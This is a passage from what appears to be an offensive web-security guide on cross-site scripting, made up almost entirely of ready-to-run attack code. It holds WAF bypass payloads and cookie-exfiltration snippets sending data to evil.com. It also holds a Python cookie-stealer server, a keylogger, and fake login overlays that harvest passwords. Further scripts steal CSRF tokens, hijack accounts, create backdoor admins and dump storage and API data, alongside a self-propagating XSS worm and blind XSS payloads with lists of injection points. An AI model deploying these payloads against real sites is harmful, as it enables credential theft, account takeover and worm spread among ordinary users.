  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Quote Bypass"}
  ```html [waf-quote-bypass.html]
  <!-- When quotes are filtered -->

  <!-- No quotes needed -->
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>

  <!-- Using / instead of space and quotes -->
  <img/src=x/onerror=alert(1)>
  <svg/onload=alert(1)>

  <!-- Backticks instead of quotes -->
  <img src=x onerror=alert`1`>

  <!-- Using String.fromCharCode -->
  <img src=x onerror=alert(String.fromCharCode(88,83,83))>

  <!-- Using regex source -->
  <img src=x onerror=alert(/XSS/.source)>

  <!-- Using numbers (no quotes needed) -->
  <img src=x onerror=alert(1)>
  <img src=x onerror=alert(1337)>
  <img src=x onerror=alert(document.domain)>

  <!-- Encoding quotes -->
  <img src=x onerror=alert(&quot;XSS&quot;)>
  <img src=x onerror=alert(&#39;XSS&#39;)>
  <img src=x onerror=alert(\x22XSS\x22)>
  <img src=x onerror=alert(\u0022XSS\u0022)>
  ```
  :::
::

### Cloudflare WAF Bypass

::code-collapse

```html [cloudflare-bypass.html]
<!-- Cloudflare WAF Bypass Payloads -->
<!-- Note: Cloudflare updates rules frequently. Test current effectiveness. -->

<!-- Mutation-based -->
<img src=x onerror="globalThis['alert'](1)">
<img src=x onerror=top[/al/.source+/ert/.source](1)>

<!-- SVG-based -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>

<!-- Math ML -->
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click

<!-- Details/Summary -->
<details open ontoggle=alert(1)>Summary</details>

<!-- Using lesser-known events -->
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href=#x>click

<!-- Template injection -->
<svg><script>alert&#40;1)</script>

<!-- Base64 + eval -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- Constructor chain -->
<img src=x onerror="[].constructor.constructor('alert(1)')()">

<!-- Import() -->
<script>import('data:text/javascript,alert(1)')</script>

<!-- Using fetch to exfil without alert -->
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

<!-- Prototype chain -->
<img src=x onerror="Object.constructor('alert(1)')()">
```

::

### ModSecurity / OWASP CRS Bypass

::code-collapse

```html [modsecurity-bypass.html]
<!-- ModSecurity Core Rule Set (CRS) Bypass Payloads -->

<!-- CRS Paranoia Level 1 Bypasses -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- CRS Paranoia Level 2 Bypasses -->
<img src=x onerror=window['al\x65rt'](1)>
<img src=x onerror="self['\x61\x6c\x65\x72\x74'](1)">
<svg onload="top['al'%2b'ert'](1)">

<!-- Using data URIs -->
<object data="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Nested encoding -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">XSS</a>

<!-- SVG in XML context -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<!-- Mutation XSS (mXSS) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>

<!-- Multipart body bypass -->
<!-- Send XSS payload in multipart form body which some WAFs skip -->

<!-- Request splitting / smuggling + XSS -->
<!-- Bypass WAF by smuggling the XSS through HTTP desync -->
```

::

---

## Exploitation Techniques

### Cookie Theft & Session Hijacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cookie Exfiltration"}
  ```javascript [cookie-theft.js]
  // Method 1: Image beacon (most reliable, no CORS issues)
  new Image().src='https://evil.com/steal?c='+document.cookie;

  // Method 2: Fetch API
  fetch('https://evil.com/steal?c='+encodeURIComponent(document.cookie));

  // Method 3: XMLHttpRequest
  var x=new XMLHttpRequest();
  x.open('GET','https://evil.com/steal?c='+document.cookie);
  x.send();

  // Method 4: Navigator.sendBeacon (survives page unload)
  navigator.sendBeacon('https://evil.com/steal',document.cookie);

  // Method 5: Redirect (visible to user)
  document.location='https://evil.com/steal?c='+document.cookie;
  window.location='https://evil.com/steal?c='+document.cookie;

  // Method 6: DNS exfiltration (stealthy)
  var c=document.cookie.replace(/[^a-zA-Z0-9]/g,'x');
  new Image().src='https://'+c+'.evil.com/x';

  // Method 7: WebSocket (bypasses some CSP)
  var ws=new WebSocket('wss://evil.com/ws');
  ws.onopen=function(){ws.send(document.cookie)};

  // Method 8: CSS injection (exfil without JS execution)
  // If you can inject CSS but not JS:
  // Use CSS attribute selectors to leak token character by character

  // Complete payload with error handling
  (function(){
    try{
      var c=document.cookie;
      var l=document.location.href;
      var d=document.domain;
      var data=btoa(JSON.stringify({cookie:c,url:l,domain:d}));
      new Image().src='https://evil.com/collect?d='+data;
    }catch(e){}
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Cookie Stealer Server"}
  ```python [cookie-stealer-server.py]
  #!/usr/bin/env python3
  """
  XSS Cookie Stealer Server
  Receives and logs stolen cookies/sessions
  """
  
  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  from datetime import datetime
  import base64
  import json
  import ssl

  LOG_FILE = 'stolen_cookies.log'

  class StealHandler(BaseHTTPRequestHandler):
      def do_GET(self):
          parsed = urlparse(self.path)
          params = parse_qs(parsed.query)
          
          timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
          source_ip = self.client_address[0]
          user_agent = self.headers.get('User-Agent', 'N/A')
          referer = self.headers.get('Referer', 'N/A')
          
          # Extract cookie data
          cookie_data = params.get('c', params.get('d', ['']))[0]
          
          # Try base64 decode
          try:
              decoded = base64.b64decode(cookie_data).decode()
              cookie_data = decoded
          except:
              pass
          
          # Log the stolen data
          log_entry = {
              'timestamp': timestamp,
              'source_ip': source_ip,
              'user_agent': user_agent,
              'referer': referer,
              'cookie_data': cookie_data,
              'full_path': self.path
          }
          
          with open(LOG_FILE, 'a') as f:
              f.write(json.dumps(log_entry) + '\n')
          
          print(f"\n{'='*60}")
          print(f"[+] COOKIE STOLEN!")
          print(f"    Time:    {timestamp}")
          print(f"    From:    {source_ip}")
          print(f"    Referer: {referer}")
          print(f"    Cookie:  {cookie_data[:200]}")
          print(f"{'='*60}")
          
          # Return 1x1 pixel
          self.send_response(200)
          self.send_header('Content-Type', 'image/gif')
          self.send_header('Access-Control-Allow-Origin', '*')
          self.end_headers()
          self.wfile.write(
              b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
              b'\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,'
              b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
          )

      def do_POST(self):
          content_length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(content_length).decode()
          
          timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
          print(f"\n[+] POST data received at {timestamp}:")
          print(f"    Body: {body[:500]}")
          
          with open(LOG_FILE, 'a') as f:
              f.write(json.dumps({
                  'timestamp': timestamp,
                  'method': 'POST',
                  'body': body,
                  'source': self.client_address[0]
              }) + '\n')
          
          self.send_response(200)
          self.send_header('Access-Control-Allow-Origin', '*')
          self.end_headers()
          self.wfile.write(b'OK')

      def log_message(self, format, *args):
          pass  # Suppress default logging

  if __name__ == '__main__':
      PORT = 8443
      print(f"[*] Cookie Stealer Server running on port {PORT}")
      print(f"[*] Logging to {LOG_FILE}")
      
      server = HTTPServer(('0.0.0.0', PORT), StealHandler)
      # For HTTPS (recommended):
      # server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem')
      server.serve_forever()
  ```
  :::
::

### Keylogger Injection

::code-collapse

```javascript [xss-keylogger.js]
// XSS Keylogger — Captures all keystrokes on the page
// Inject via XSS to capture credentials as they're typed

(function() {
  'use strict';
  
  const EXFIL_URL = 'https://evil.com/keys';
  let buffer = '';
  let lastField = '';
  let credentials = {};
  
  // Capture all keystrokes
  document.addEventListener('keypress', function(e) {
    const target = e.target;
    const tagName = target.tagName.toLowerCase();
    const fieldType = target.type || '';
    const fieldName = target.name || target.id || 'unknown';
    
    // Track which field is being typed in
    if (lastField !== fieldName) {
      if (buffer.length > 0) {
        exfiltrate(lastField, buffer);
      }
      buffer = '';
      lastField = fieldName;
    }
    
    buffer += e.key;
    
    // Special handling for password fields
    if (fieldType === 'password') {
      credentials.password = (credentials.password || '') + e.key;
    }
    if (fieldType === 'email' || fieldName.match(/user|email|login/i)) {
      credentials.username = (credentials.username || '') + e.key;
    }
  }, true);
  
  // Capture form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    formData.forEach((v, k) => data[k] = v);
    
    navigator.sendBeacon(EXFIL_URL, JSON.stringify({
      type: 'form_submit',
      action: form.action,
      data: data,
      credentials: credentials,
      url: location.href,
      timestamp: new Date().toISOString()
    }));
  }, true);
  
  // Capture paste events
  document.addEventListener('paste', function(e) {
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    exfiltrate('PASTE_EVENT', pasted);
  }, true);
  
  // Periodic buffer flush
  setInterval(function() {
    if (buffer.length > 0) {
      exfiltrate(lastField, buffer);
      buffer = '';
    }
  }, 5000);
  
  function exfiltrate(field, data) {
    navigator.sendBeacon(EXFIL_URL, JSON.stringify({
      type: 'keylog',
      field: field,
      data: data,
      url: location.href,
      timestamp: new Date().toISOString()
    }));
  }
  
  // Also capture autofill
  setTimeout(function() {
    document.querySelectorAll('input').forEach(function(input) {
      if (input.value) {
        exfiltrate(input.name || input.id || input.type, input.value);
      }
    });
  }, 2000);
})();
```

::

### Phishing via XSS — Login Form Injection

::tabs
  :::tabs-item{icon="i-lucide-code" label="Fake Login Overlay"}
  ```javascript [xss-phishing.js]
  // Inject a fake login form over the real page
  // Victim thinks they've been logged out and re-enters credentials

  document.body.innerHTML = `
  <div style="
    position:fixed; top:0; left:0; right:0; bottom:0;
    background:white; z-index:99999;
    display:flex; align-items:center; justify-content:center;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  ">
    <div style="
      width:400px; padding:40px;
      border:1px solid #ddd; border-radius:8px;
      box-shadow:0 2px 10px rgba(0,0,0,0.1);
    ">
      <h2 style="margin:0 0 8px;font-size:24px;color:#333;">
        Session Expired
      </h2>
      <p style="color:#666;margin:0 0 24px;font-size:14px;">
        Your session has expired. Please log in again to continue.
      </p>
      <form id="phish-form">
        <div style="margin-bottom:16px;">
          <label style="display:block;margin-bottom:4px;color:#555;font-size:14px;">
            Email
          </label>
          <input type="email" id="phish-email" 
            style="width:100%;padding:10px;border:1px solid #ddd;
                   border-radius:4px;font-size:14px;box-sizing:border-box;"
            placeholder="you@example.com" required>
        </div>
        <div style="margin-bottom:24px;">
          <label style="display:block;margin-bottom:4px;color:#555;font-size:14px;">
            Password
          </label>
          <input type="password" id="phish-pass"
            style="width:100%;padding:10px;border:1px solid #ddd;
                   border-radius:4px;font-size:14px;box-sizing:border-box;"
            placeholder="••••••••" required>
        </div>
        <button type="submit" style="
          width:100%;padding:12px;background:#0066ff;color:white;
          border:none;border-radius:4px;font-size:16px;cursor:pointer;
        ">Log In</button>
      </form>
    </div>
  </div>`;

  document.getElementById('phish-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('phish-email').value;
    var pass = document.getElementById('phish-pass').value;
    
    // Exfiltrate credentials
    navigator.sendBeacon('https://evil.com/phish', JSON.stringify({
      email: email,
      password: pass,
      domain: document.domain,
      url: location.href,
      timestamp: new Date().toISOString()
    }));
    
    // Redirect to real login to avoid suspicion
    setTimeout(function() {
      location.href = '/login?session_expired=true';
    }, 1000);
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="One-Liner Version"}
  ```html [phishing-oneliner.html]
  <!-- Compact phishing payload for tight injection contexts -->
  <script>
  document.body.innerHTML='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center"><div style="width:350px;padding:30px;border:1px solid #ccc;border-radius:8px"><h2>Session Expired</h2><form onsubmit="new Image().src=`https://evil.com/p?u=${this.e.value}&p=${this.p.value}`;return false"><input name=e placeholder=Email style="width:100%;padding:8px;margin:8px 0"><input name=p type=password placeholder=Password style="width:100%;padding:8px;margin:8px 0"><button style="width:100%;padding:10px;background:#07f;color:#fff;border:none">Login</button></form></div></div>';
  </script>
  ```
  :::
::

### CSRF Token Theft & Action Hijacking

::code-collapse

```javascript [csrf-token-theft.js]
// XSS → CSRF Token Theft → Perform Actions as Victim
// Complete exploitation chain

(function() {
  // Step 1: Fetch page containing CSRF token
  fetch('/settings', { credentials: 'include' })
    .then(r => r.text())
    .then(html => {
      // Step 2: Extract CSRF token
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      
      // Try multiple common CSRF token locations
      let csrfToken = null;
      
      // Meta tag
      const metaToken = doc.querySelector('meta[name="csrf-token"]');
      if (metaToken) csrfToken = metaToken.content;
      
      // Hidden input
      if (!csrfToken) {
        const inputToken = doc.querySelector('input[name="_token"], input[name="csrf_token"], input[name="authenticity_token"], input[name="_csrf"]');
        if (inputToken) csrfToken = inputToken.value;
      }
      
      // From cookie
      if (!csrfToken) {
        const cookieMatch = document.cookie.match(/csrf[_-]?token=([^;]+)/);
        if (cookieMatch) csrfToken = cookieMatch[1];
      }
      
      console.log('[+] CSRF Token:', csrfToken);
      
      if (!csrfToken) {
        console.log('[-] No CSRF token found');
        return;
      }
      
      // Step 3: Exfiltrate the token
      navigator.sendBeacon('https://evil.com/csrf', JSON.stringify({
        token: csrfToken,
        domain: document.domain,
        cookies: document.cookie
      }));
      
      // Step 4: Use the token to perform privileged actions
      
      // Change email (account takeover chain)
      fetch('/api/account/email', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
          email: 'attacker@evil.com'
        })
      }).then(r => console.log('[+] Email changed:', r.status));
      
      // Change password
      fetch('/api/account/password', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
          new_password: 'hacked123!',
          confirm_password: 'hacked123!'
        })
      }).then(r => console.log('[+] Password changed:', r.status));
      
      // Create admin user (if victim is admin)
      fetch('/api/admin/users', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
          username: 'backdoor',
          email: 'backdoor@evil.com',
          password: 'Backdoor123!',
          role: 'admin'
        })
      }).then(r => console.log('[+] Admin user created:', r.status));
    });
})();
```

::

### XSS Worm

::code-collapse

```javascript [xss-worm.js]
// Self-propagating XSS Worm
// Spreads by posting itself to victim's profile/comments
// WARNING: For educational purposes only. XSS worms can spread exponentially.

(function() {
  'use strict';
  
  const WORM_PAYLOAD = encodeURIComponent(
    '<script src=https://evil.com/worm.js></script>'
  );
  
  // Get CSRF token from current page
  const csrfMeta = document.querySelector('meta[name="csrf-token"]');
  const csrfToken = csrfMeta ? csrfMeta.content : '';
  
  // 1. Steal victim's data
  navigator.sendBeacon('https://evil.com/worm-data', JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    user: document.querySelector('.username')?.textContent,
    timestamp: Date.now()
  }));
  
  // 2. Spread: Post worm to victim's profile/status
  fetch('/api/posts', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
      content: 'Check out this amazing deal! ' + 
               decodeURIComponent(WORM_PAYLOAD),
      visibility: 'public'
    })
  });
  
  // 3. Spread: Send worm via direct messages to victim's contacts
  fetch('/api/contacts', { credentials: 'include' })
    .then(r => r.json())
    .then(contacts => {
      contacts.forEach(contact => {
        fetch('/api/messages', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
          },
          body: JSON.stringify({
            to: contact.id,
            message: 'Hey! Check this out: ' + 
                     decodeURIComponent(WORM_PAYLOAD)
          })
        });
      });
    });
  
  // 4. Spread: Update victim's profile with worm
  fetch('/api/profile', {
    method: 'PUT',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
      bio: 'Welcome to my page! ' + decodeURIComponent(WORM_PAYLOAD)
    })
  });
})();
```

::

---

## Privilege Escalation via XSS

::caution
XSS is the **ultimate client-side privilege escalation vector**. Once you can execute JavaScript in a user's browser within the application's origin, you have the same power as that user within the application.
::

### PrivEsc — User to Admin

::tabs
  :::tabs-item{icon="i-lucide-code" label="Admin Account Creation"}
  ```javascript [privesc-admin-create.js]
  // XSS executed in admin's browser → create backdoor admin account
  
  // Step 1: Discover admin endpoints
  async function findAdminEndpoints() {
    const endpoints = [
      '/admin/api/users',
      '/api/admin/users',
      '/api/v1/admin/users',
      '/admin/users/create',
      '/management/api/users',
      '/api/users?role=admin'
    ];
    
    for (const ep of endpoints) {
      try {
        const resp = await fetch(ep, { credentials: 'include' });
        if (resp.status === 200) {
          console.log('[+] Found admin endpoint:', ep);
          return ep;
        }
      } catch(e) {}
    }
    return null;
  }
  
  // Step 2: Extract CSRF token
  function getCSRF() {
    const meta = document.querySelector('meta[name="csrf-token"]');
    if (meta) return meta.content;
    
    const input = document.querySelector('input[name="_token"]');
    if (input) return input.value;
    
    const cookie = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
    if (cookie) return decodeURIComponent(cookie[1]);
    
    return '';
  }
  
  // Step 3: Create backdoor admin
  async function createBackdoor() {
    const endpoint = await findAdminEndpoints();
    const csrf = getCSRF();
    
    const backdoorUser = {
      username: 'support_service',  // Innocuous name
      email: 'support@legitimate-looking-domain.com',
      password: 'Str0ng!Backdoor#2024',
      role: 'administrator',
      is_active: true,
      is_superuser: true
    };
    
    const resp = await fetch(endpoint || '/api/admin/users', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify(backdoorUser)
    });
    
    // Exfiltrate result
    navigator.sendBeacon('https://evil.com/privesc', JSON.stringify({
      action: 'admin_created',
      status: resp.status,
      credentials: backdoorUser,
      admin_cookies: document.cookie
    }));
    
    return resp;
  }
  
  createBackdoor();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Role Elevation"}
  ```javascript [privesc-role-elevation.js]
  // Change current user's role from user to admin
  // Works when stored XSS is visited by an admin who can modify roles

  (async function() {
    // Get attacker's user ID (stored in hidden element, cookie, or API)
    const ATTACKER_USER_ID = '12345';  // Replace with actual ID
    
    // Method 1: Direct role change API
    const roleEndpoints = [
      `/api/users/${ATTACKER_USER_ID}/role`,
      `/api/admin/users/${ATTACKER_USER_ID}`,
      `/admin/api/change-role`
    ];
    
    const csrf = document.querySelector('meta[name="csrf-token"]')?.content || '';
    
    for (const endpoint of roleEndpoints) {
      try {
        // Try PATCH
        let resp = await fetch(endpoint, {
          method: 'PATCH',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrf
          },
          body: JSON.stringify({
            role: 'admin',
            is_admin: true,
            permissions: ['*'],
            group: 'administrators'
          })
        });
        
        if (resp.ok) {
          navigator.sendBeacon('https://evil.com/escalated', JSON.stringify({
            endpoint: endpoint,
            method: 'PATCH',
            status: resp.status,
            user_id: ATTACKER_USER_ID
          }));
          console.log('[+] ROLE ESCALATED via', endpoint);
          return;
        }
        
        // Try PUT
        resp = await fetch(endpoint, {
          method: 'PUT',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrf
          },
          body: JSON.stringify({
            role: 'admin',
            is_admin: true
          })
        });
        
        if (resp.ok) {
          console.log('[+] ROLE ESCALATED via PUT', endpoint);
          return;
        }
      } catch(e) {}
    }
    
    // Method 2: Invite attacker as admin
    try {
      await fetch('/api/admin/invite', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrf
        },
        body: JSON.stringify({
          email: 'attacker@evil.com',
          role: 'admin'
        })
      });
      console.log('[+] Admin invite sent to attacker email');
    } catch(e) {}
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Attack Chain"}
  ```text [privesc-chain.txt]
  XSS PRIVILEGE ESCALATION CHAINS:
  ═════════════════════════════════
  
  CHAIN 1: Stored XSS → Admin Cookie → Full Admin Access
  ─────────────────────────────────────────────────────────
  1. Find stored XSS (comment, profile, forum post)
  2. Inject cookie-stealing payload
  3. Admin views the page → cookie exfiltrated
  4. Attacker replays admin session cookie
  5. Full admin access achieved
  
  CHAIN 2: Stored XSS → CSRF → Admin Account Creation
  ─────────────────────────────────────────────────────
  1. Find stored XSS in area visible to admins
  2. Inject payload that creates new admin account
  3. Admin views page → JavaScript creates backdoor admin
  4. Attacker logs in with backdoor credentials
  5. Persistent admin access (survives cookie rotation)
  
  CHAIN 3: Reflected XSS → Social Engineer Admin → Takeover
  ──────────────────────────────────────────────────────────
  1. Find reflected XSS on the application
  2. Craft URL with credential-stealing payload
  3. Send URL to admin via email/support ticket
  4. Admin clicks → credentials exfiltrated
  5. Login as admin with stolen credentials
  
  CHAIN 4: DOM XSS → Service Worker → Persistent Access
  ─────────────────────────────────────────────────────
  1. Find DOM XSS on any page
  2. Inject Service Worker registration payload
  3. Service Worker intercepts ALL future requests
  4. Captures credentials, tokens, and data
  5. Persists even after XSS is fixed (until SW removed)
  
  CHAIN 5: XSS → OAuth Token Theft → Account Takeover
  ───────────────────────────────────────────────────
  1. Find XSS on OAuth callback page
  2. Steal OAuth access_token from URL fragment
  3. Use token to access victim's data via API
  4. Change email, password → permanent takeover
  
  CHAIN 6: XSS → API Key Extraction → Backend Access
  ──────────────────────────────────────────────────
  1. Find XSS on admin dashboard
  2. Read API keys from admin settings page
  3. Exfiltrate keys to attacker
  4. Direct API access without needing browser session
  5. Bypass IP restrictions (API keys are often unrestricted)
  ```
  :::
::

### PrivEsc — Sensitive Data Extraction

::code-collapse

```javascript [data-extraction.js]
// Complete data extraction payload
// Scrapes all visible and API-accessible data from victim's session

(async function() {
  const EXFIL = 'https://evil.com/data';
  const data = {
    timestamp: new Date().toISOString(),
    domain: document.domain,
    url: location.href,
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    page_data: {},
    api_data: {}
  };

  // 1. Dump localStorage
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      data.localStorage[key] = localStorage.getItem(key);
    }
  } catch(e) {}

  // 2. Dump sessionStorage
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      data.sessionStorage[key] = sessionStorage.getItem(key);
    }
  } catch(e) {}

  // 3. Extract sensitive page content
  try {
    // Look for tokens, keys, secrets in the page
    const pageHTML = document.documentElement.outerHTML;
    
    const patterns = {
      api_keys: pageHTML.match(/['"](?:api[_-]?key|apikey|api[_-]?secret)['"]:\s*['"]([^'"]+)['"]/gi),
      tokens: pageHTML.match(/['"](?:token|access_token|auth_token|bearer)['"]:\s*['"]([^'"]+)['"]/gi),
      secrets: pageHTML.match(/['"](?:secret|password|credential)['"]:\s*['"]([^'"]+)['"]/gi),
      aws_keys: pageHTML.match(/AKIA[0-9A-Z]{16}/g),
      jwt_tokens: pageHTML.match(/eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g),
      emails: pageHTML.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g)
    };
    
    data.page_data = patterns;
  } catch(e) {}

  // 4. Fetch sensitive API endpoints
  const sensitiveEndpoints = [
    '/api/me', '/api/user', '/api/profile',
    '/api/account', '/api/settings',
    '/api/admin/users', '/api/admin/config',
    '/api/keys', '/api/tokens',
    '/api/billing', '/api/payment-methods',
    '/settings/security', '/account/api-keys'
  ];

  for (const endpoint of sensitiveEndpoints) {
    try {
      const resp = await fetch(endpoint, { credentials: 'include' });
      if (resp.ok) {
        const body = await resp.text();
        data.api_data[endpoint] = body.substring(0, 5000);
      }
    } catch(e) {}
  }

  // 5. Exfiltrate everything
  // Split into chunks if too large
  const jsonData = JSON.stringify(data);
  const chunkSize = 50000;
  
  for (let i = 0; i < jsonData.length; i += chunkSize) {
    const chunk = jsonData.substring(i, i + chunkSize);
    navigator.sendBeacon(EXFIL, JSON.stringify({
      chunk_index: Math.floor(i / chunkSize),
      total_chunks: Math.ceil(jsonData.length / chunkSize),
      data: chunk
    }));
  }
})();
```

::

---

## Blind XSS

::note
**Blind XSS** occurs when the payload is stored and triggers in a context the attacker cannot directly observe — such as admin panels, support dashboards, log viewers, or email clients.
::

### Blind XSS Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Blind XSS — Full Recon"}
  ```javascript [blind-xss-recon.js]
  // Blind XSS payload — comprehensive data collection
  // Include this as external script: <script src=https://evil.com/blind.js></script>

  (function() {
    var exfil = 'https://evil.com/blind';
    var data = {
      url: location.href,
      domain: document.domain,
      cookie: document.cookie,
      referrer: document.referrer,
      origin: location.origin,
      title: document.title,
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: screen.width + 'x' + screen.height,
      
      // Page content (first 10KB)
      html: document.documentElement.outerHTML.substring(0, 10000),
      
      // All links on page
      links: Array.from(document.querySelectorAll('a[href]'))
              .map(a => a.href).slice(0, 50),
      
      // All form data
      forms: Array.from(document.querySelectorAll('form'))
              .map(f => ({
                action: f.action,
                method: f.method,
                inputs: Array.from(f.querySelectorAll('input'))
                        .map(i => ({ name: i.name, type: i.type, value: i.value }))
              })),
      
      // LocalStorage dump
      localStorage: JSON.stringify(localStorage),
      
      // Session storage dump
      sessionStorage: JSON.stringify(sessionStorage),
      
      // Timestamp
      timestamp: new Date().toISOString()
    };

    // Take screenshot (if html2canvas is available or can be loaded)
    try {
      var s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
      s.onload = function() {
        html2canvas(document.body).then(function(canvas) {
          data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
          sendData();
        });
      };
      s.onerror = function() { sendData(); };
      document.head.appendChild(s);
    } catch(e) {
      sendData();
    }

    function sendData() {
      // Multiple exfiltration methods
      try { navigator.sendBeacon(exfil, JSON.stringify(data)); } catch(e) {}
      try {
        fetch(exfil, {
          method: 'POST',
          mode: 'no-cors',
          body: JSON.stringify(data)
        });
      } catch(e) {}
      try {
        new Image().src = exfil + '?d=' + btoa(JSON.stringify({
          url: data.url, cookie: data.cookie, domain: data.domain
        }));
      } catch(e) {}
    }
    
    setTimeout(sendData, 5000);  // Fallback
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Injection Vectors"}
  ```text [blind-xss-injection-vectors.txt]
  BLIND XSS INJECTION POINTS:
  ═══════════════════════════
  
  Contact/Support Forms:
  ├── Name field: <script src=//evil.com/b.js></script>
  ├── Email field: <script src=//evil.com/b.js></script>@evil.com
  ├── Subject: <script src=//evil.com/b.js></script>
  ├── Message body: <script src=//evil.com/b.js></script>
  └── File upload name: <script src=//evil.com/b.js></script>.pdf
  
  User Registration:
  ├── Username: <script src=//evil.com/b.js></script>
  ├── Display name: <script src=//evil.com/b.js></script>
  ├── Bio/About: <script src=//evil.com/b.js></script>
  └── Avatar alt text: <script src=//evil.com/b.js></script>
  
  E-commerce:
  ├── Shipping address: <script src=//evil.com/b.js></script>
  ├── Order notes: <script src=//evil.com/b.js></script>
  ├── Review text: <script src=//evil.com/b.js></script>
  └── Product name (if user-created): <script src=//evil.com/b.js></script>
  
  HTTP Headers (rendered in logs/admin panels):
  ├── User-Agent: <script src=//evil.com/b.js></script>
  ├── Referer: <script src=//evil.com/b.js></script>
  ├── X-Forwarded-For: <script src=//evil.com/b.js></script>
  └── Cookie values: <script src=//evil.com/b.js></script>
  
  API Inputs:
  ├── JSON values: {"name":"<script src=//evil.com/b.js></script>"}
  ├── XML fields: <name><![CDATA[<script src=//evil.com/b.js></script>]]></name>
  └── GraphQL: mutation { updateUser(name: "<script src=//evil.com/b.js></script>") }
  
  Error Messages:
  ├── Invalid input triggers error → error logged with input
  ├── 404 page with URL reflected
  └── Stack traces that include user input
  ```
  :::
::

### Blind XSS Tools

::card-group
  ::card
  ---
  title: XSS Hunter
  icon: i-simple-icons-github
  to: https://github.com/mandatoryprogrammer/xsshunter-express
  target: _blank
  ---
  Self-hosted blind XSS detection platform. Captures screenshots, cookies, page HTML, and more when blind XSS payloads fire in admin panels.
  ::

  ::card
  ---
  title: ezXSS
  icon: i-simple-icons-github
  to: https://github.com/ssl/ezXSS
  target: _blank
  ---
  Easy-to-use blind XSS platform with dashboard, email notifications, and payload management. Captures DOM, cookies, screenshots.
  ::

  ::card
  ---
  title: Burp Collaborator
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/collaborator
  target: _blank
  ---
  Built into Burp Suite Professional. Use as callback domain for blind XSS detection. Supports DNS, HTTP, and SMTP interactions.
  ::

  ::card
  ---
  title: interact.sh
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/interactsh
  target: _blank
  ---
  Open-source alternative to Burp Collaborator by ProjectDiscovery. Self-hostable with OOB interaction detection for blind XSS, SSRF, and more.
  ::
::

---

## CSP Bypass Techniques

::warning
